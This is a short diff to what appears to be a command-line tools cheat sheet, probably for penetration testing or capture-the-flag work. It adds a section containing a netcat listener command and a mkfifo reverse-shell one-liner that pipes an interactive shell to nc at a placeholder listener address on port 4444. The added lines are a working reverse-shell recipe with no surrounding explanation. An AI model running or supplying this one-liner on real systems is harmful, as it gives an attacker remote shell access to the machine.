@@ -68,3 +68,11 @@ objdump # Display information from object files
 strings # Display text strings embedded in binary
 exiftool # Show/Remove files metadata
 ```
+
+### -1
+
+`nc -lvp 4444`
+```sh
+mkfifo /tmp/fifo
+sh -i < /tmp/fifo 2>&1 | nc IP_LISTENER 4444 > /tmp/fifo
+```
